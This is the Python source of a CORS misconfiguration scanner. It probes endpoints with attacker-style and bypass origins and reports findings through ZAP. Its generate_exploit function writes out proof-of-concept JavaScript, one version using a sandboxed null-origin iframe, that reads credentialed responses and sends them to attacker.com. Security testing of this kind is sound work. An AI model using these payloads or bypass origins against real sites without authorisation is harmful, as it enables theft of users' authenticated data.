"""
CORS Misconfiguration Testing
Origin reflection, null origin, wildcard detection
Reference: https://portswigger.net/web-security/cors

All requests routed through ZAP for unified logging and alerting.
"""
from dataclasses import dataclass
from typing import Dict, List, Optional, TYPE_CHECKING
from urllib.parse import urlparse

if TYPE_CHECKING:
    from modules.zap_http_client import ZAPHttpClient


@dataclass
class CORSResult:
    url: str
    vulnerability_type: str
    vulnerable: bool
    confidence: float
    evidence: Dict
    severity: str = "High"
    cwe: str = "CWE-346"
    cvss: float = 7.5


class CORSTester:
    """
    Test for CORS misconfigurations
    - Arbitrary origin reflection
    - Null origin acceptance
    - Wildcard with credentials
    - Subdomain/prefix bypass
    - Pre-flight bypass
    """

    # Test origins for reflection attacks
    TEST_ORIGINS = [
        'https://evil.com',
        'https://attacker.com',
        'null',
        'https://localhost',
        'https://localhost:8080',
        'https://127.0.0.1',
        'https://[::1]',
    ]

    # CORS response headers to check
    CORS_HEADERS = [
        'access-control-allow-origin',
        'access-control-allow-credentials',
        'access-control-allow-methods',
        'access-control-allow-headers',
        'access-control-expose-headers',
        'access-control-max-age'
    ]

    def __init__(self, har_data: Dict, config: Dict = None,
                 zap_client: 'ZAPHttpClient' = None):
        self.har_data = har_data
        self.config = config or {}
        self.timeout = self.config.get('cors_timeout', 10)
        self.zap_client = zap_client
        self._use_zap = zap_client is not None

    def _get(self, url: str, headers: Dict = None) -> Optional[Dict]:
        """HTTP GET via ZAP or fallback to requests"""
        try:
            if self._use_zap:
                resp = self.zap_client.get(url, headers=headers)
                return {
                    'status_code': resp.status_code,
                    'headers': resp.headers,
                    'text': resp.text
                }
            else:
                import requests
                resp = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                return {
                    'status_code': resp.status_code,
                    'headers': dict(resp.headers),
                    'text': resp.text
                }
        except Exception:
            return None

    def _options(self, url: str, headers: Dict = None) -> Optional[Dict]:
        """HTTP OPTIONS via ZAP or fallback to requests"""
        try:
            if self._use_zap:
                resp = self.zap_client.options(url, headers=headers)
                return {
                    'status_code': resp.status_code,
                    'headers': resp.headers
                }
            else:
                import requests
                resp = requests.options(url, headers=headers, timeout=self.timeout, verify=False)
                return {
                    'status_code': resp.status_code,
                    'headers': dict(resp.headers)
                }
        except Exception:
            return None

    def _raise_alert(self, result: 'CORSResult'):
        """Raise ZAP alert for finding"""
        if self._use_zap and result.vulnerable:
            risk_map = {'Critical': 3, 'High': 3, 'Medium': 2, 'Low': 1, 'Info': 0}
            self.zap_client.raise_alert(
                risk=risk_map.get(result.severity, 2),
                name=f"CORS: {result.vulnerability_type}",
                description=f"CORS misconfiguration detected: {result.vulnerability_type}",
                url=result.url,
                evidence=str(result.evidence),
                solution="Implement strict origin allowlist",
                cwe_id=346
            )

    def identify_cors_endpoints(self) -> List[Dict]:
        """Find endpoints that return CORS headers"""
        cors_endpoints = []
        entries = self.har_data.get('log', {}).get('entries', [])

        for entry in entries:
            response = entry.get('response', {})
            headers = {h['name'].lower(): h['value']
                      for h in response.get('headers', [])}

            cors_headers = {h: headers[h] for h in self.CORS_HEADERS if h in headers}

            if cors_headers:
                request = entry.get('request', {})
                cors_endpoints.append({
                    'url': request.get('url'),
                    'method': request.get('method', 'GET'),
                    'cors_headers': cors_headers,
                    'original_origin': next(
                        (h['value'] for h in request.get('headers', [])
                         if h['name'].lower() == 'origin'),
                        None
                    )
                })

        return cors_endpoints

    def _get_cors_response(self, url: str, origin: str) -> Optional[Dict]:
        """Make request with Origin header and return CORS info"""
        response = self._get(url, headers={'Origin': origin})
        if not response:
            return None

        try:
            cors_headers = {}
            for header in self.CORS_HEADERS:
                value = response.headers.get(header)
                if value:
                    cors_headers[header] = value

            return {
                'status_code': response.status_code,
                'cors_headers': cors_headers,
                'acao': response.headers.get('access-control-allow-origin', ''),
                'acac': response.headers.get('access-control-allow-credentials', '').lower()
            }
        except Exception:
            return None

    def test_origin_reflection(self, url: str) -> List[CORSResult]:
        """Test if arbitrary origins are reflected in ACAO"""
        results = []

        for test_origin in self.TEST_ORIGINS:
            cors_info = self._get_cors_response(url, test_origin)
            if not cors_info:
                continue

            acao = cors_info['acao']
            acac = cors_info['acac']

            # Critical: Origin reflected with credentials
            if acao == test_origin and acac == 'true':
                results.append(CORSResult(
                    url=url,
                    vulnerability_type='origin_reflection_with_credentials',
                    vulnerable=True,
                    confidence=1.0,
                    evidence={
                        'test_origin': test_origin,
                        'reflected_origin': acao,
                        'credentials_allowed': True,
                        'cors_headers': cors_info['cors_headers']
                    },
                    severity="Critical",
                    cvss=9.8
                ))
                break  # Found worst case

            # High: Origin reflected without credentials
            elif acao == test_origin:
                results.append(CORSResult(
                    url=url,
                    vulnerability_type='origin_reflection',
                    vulnerable=True,
                    confidence=0.9,
                    evidence={
                        'test_origin': test_origin,
                        'reflected_origin': acao,
                        'credentials_allowed': False
                    },
                    severity="High",
                    cvss=7.5
                ))

            # High: Null origin accepted with credentials
            elif test_origin == 'null' and acao == 'null' and acac == 'true':
                results.append(CORSResult(
                    url=url,
                    vulnerability_type='null_origin_with_credentials',
                    vulnerable=True,
                    confidence=0.95,
                    evidence={
                        'null_accepted': True,
                        'credentials_allowed': True,
                        'exploit': 'Use sandboxed iframe to send null origin'
                    },
                    severity="Critical",
                    cvss=9.0
                ))

            # Medium: Null origin accepted
            elif test_origin == 'null' and acao == 'null':
                results.append(CORSResult(
                    url=url,
                    vulnerability_type='null_origin_accepted',
                    vulnerable=True,
                    confidence=0.8,
                    evidence={
                        'null_accepted': True,
                        'credentials_allowed': False
                    },
                    severity="Medium",
                    cvss=5.0
                ))

        # Check for wildcard
        cors_info = self._get_cors_response(url, 'https://test.com')
        if cors_info and cors_info['acao'] == '*':
            # Wildcard is less severe but still notable
            results.append(CORSResult(
                url=url,
                vulnerability_type='wildcard_origin',
                vulnerable=True,
                confidence=0.7,
                evidence={
                    'allow_origin': '*',
                    'note': 'Wildcard prevents credentials but allows data theft'
                },
                severity="Medium",
                cvss=5.0
            ))

        return results

    def test_origin_bypass(self, url: str) -> List[CORSResult]:
        """Test for origin validation bypass techniques"""
        results = []
        parsed = urlparse(url)
        target_domain = parsed.netloc

        # Generate bypass origins
        bypass_origins = [
            # Subdomain of attacker
            f"https://{target_domain}.evil.com",
            # Prefix bypass
            f"https://evil{target_domain}",
            # Suffix bypass
            f"https://evil.com.{target_domain}",
            # Null byte
            f"https://{target_domain}%00.evil.com",
            # Backtick bypass
            f"https://{target_domain}`evil.com",
            # Protocol downgrade
            f"http://{target_domain}",
            # Port variation
            f"https://{target_domain}:evil.com",
            # Unicode bypass
            f"https://{target_domain}。evil.com",  # Fullwidth dot
        ]

        for bypass_origin in bypass_origins:
            cors_info = self._get_cors_response(url, bypass_origin)
            if not cors_info:
                continue

            acao = cors_info['acao']

            if acao == bypass_origin:
                results.append(CORSResult(
                    url=url,
                    vulnerability_type='origin_validation_bypass',
                    vulnerable=True,
                    confidence=0.9,
                    evidence={
                        'bypass_origin': bypass_origin,
                        'reflected_origin': acao,
                        'bypass_technique': self._identify_bypass_technique(bypass_origin, target_domain)
                    },
                    severity="Critical",
                    cvss=8.5
                ))

        return results

    @staticmethod
    def _identify_bypass_technique(bypass_origin: str, target_domain: str) -> str:
        """Identify which bypass technique worked"""
        if f"{target_domain}.evil" in bypass_origin:
            return "subdomain_suffix"
        elif f"evil{target_domain}" in bypass_origin:
            return "prefix_match"
        elif "%00" in bypass_origin:
            return "null_byte"
        elif "`" in bypass_origin:
            return "backtick"
        elif "http://" in bypass_origin:
            return "protocol_downgrade"
        elif "。" in bypass_origin:
            return "unicode_bypass"
        return "unknown"

    def test_preflight_bypass(self, url: str) -> Optional[CORSResult]:
        """Test if preflight can be bypassed"""
        # Simple requests don't trigger preflight
        # Check if sensitive methods are allowed without preflight

        response = self._options(url, headers={
            'Origin': 'https://evil.com',
            'Access-Control-Request-Method': 'PUT',
            'Access-Control-Request-Headers': 'X-Custom-Header'
        })

        if not response:
            return None

        try:
            allow_methods = response['headers'].get('access-control-allow-methods', '')
            allow_headers = response['headers'].get('access-control-allow-headers', '')

            # Check for overly permissive settings
            dangerous_methods = ['PUT', 'DELETE', 'PATCH']
            allowed_dangerous = [m for m in dangerous_methods if m in allow_methods.upper()]

            if allowed_dangerous or '*' in allow_methods:
                return CORSResult(
                    url=url,
                    vulnerability_type='permissive_preflight',
                    vulnerable=True,
                    confidence=0.6,
                    evidence={
                        'allowed_methods': allow_methods,
                        'allowed_headers': allow_headers,
                        'dangerous_methods_allowed': allowed_dangerous or ['*']
                    },
                    severity="Medium",
                    cvss=5.0
                )

        except Exception:
            pass

        return None

    def test_vary_header(self, url: str) -> Optional[CORSResult]:
        """Check if Vary: Origin header is properly set"""
        cors_info = self._get_cors_response(url, 'https://test1.com')
        if not cors_info or not cors_info['acao']:
            return None

        # Check Vary header
        response = self._get(url, headers={'Origin': 'https://test1.com'})
        if not response:
            return None

        try:
            vary = response['headers'].get('vary', '').lower()

            if 'origin' not in vary and cors_info['acao'] not in ['*', '']:
                return CORSResult(
                    url=url,
                    vulnerability_type='missing_vary_header',
                    vulnerable=True,
                    confidence=0.5,
                    evidence={
                        'vary_header': vary or 'missing',
                        'acao': cors_info['acao'],
                        'risk': 'Cache poisoning possible'
                    },
                    severity="Medium",
                    cvss=4.0
                )

        except Exception:
            pass

        return None

    def run_tests(self) -> List[CORSResult]:
        """Execute all CORS tests"""
        print("[CORS] Scanning for CORS misconfigurations...")

        # Get endpoints from HAR
        endpoints = self.identify_cors_endpoints()

        # Also test unique URLs even without observed CORS
        entries = self.har_data.get('log', {}).get('entries', [])
        all_urls = set()
        for entry in entries:
            url = entry.get('request', {}).get('url', '')
            all_urls.add(url.split('?')[0])  # Base URL without params

        for endpoint in endpoints:
            all_urls.add(endpoint['url'].split('?')[0])

        print(f"[CORS] Testing {len(all_urls)} unique endpoints")

        results = []
        tested_urls = set()

        for url in list(all_urls)[:20]:  # Limit
            if url in tested_urls:
                continue
            tested_urls.add(url)

            # Origin reflection
            reflection_results = self.test_origin_reflection(url)
            for result in reflection_results:
                results.append(result)
                if result.vulnerable:
                    print(f"[CORS] 🚨 {result.vulnerability_type}: {url[:50]}")

            # Bypass techniques
            bypass_results = self.test_origin_bypass(url)
            for result in bypass_results:
                results.append(result)
                if result.vulnerable:
                    print(f"[CORS] ⚠️ Origin bypass: {result.evidence['bypass_technique']}")

            # Preflight
            preflight_result = self.test_preflight_bypass(url)
            if preflight_result:
                results.append(preflight_result)

            # Vary header
            vary_result = self.test_vary_header(url)
            if vary_result:
                results.append(vary_result)

        return results

    def generate_report(self, results: List[CORSResult]) -> Dict:
        """Generate summary report"""
        vuln_types = {}
        for r in results:
            if r.vulnerable:
                vuln_types[r.vulnerability_type] = vuln_types.get(r.vulnerability_type, 0) + 1

        return {
            'total_endpoints_tested': len(self.identify_cors_endpoints()),
            'vulnerable_count': len([r for r in results if r.vulnerable]),
            'by_type': vuln_types,
            'findings': [
                {
                    'url': r.url,
                    'type': r.vulnerability_type,
                    'confidence': r.confidence,
                    'severity': r.severity,
                    'cwe': r.cwe,
                    'evidence': r.evidence
                }
                for r in results if r.vulnerable
            ]
        }

    @staticmethod
    def generate_exploit(result: CORSResult) -> str:
        """Generate PoC exploit code"""
        if not result.vulnerable:
            return ""

        if result.vulnerability_type == 'origin_reflection_with_credentials':
            return f'''<!-- CORS Exploit PoC -->
<script>
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('GET', '{result.url}', true);
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        // Send stolen data to attacker
        fetch('https://attacker.com/log?data=' + encodeURIComponent(xhr.responseText));
    }}
}};
xhr.send();
</script>'''

        elif result.vulnerability_type == 'null_origin_with_credentials':
            return f'''<!-- Null Origin Exploit via iframe sandbox -->
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,
<script>
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('GET', '{result.url}', true);
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        parent.postMessage(xhr.responseText, '*');
    }}
}};
xhr.send();
</script>
"></iframe>
<script>
window.onmessage = function(e) {{
    fetch('https://attacker.com/log?data=' + encodeURIComponent(e.data));
}};
</script>'''

        return "// Manual testing required"
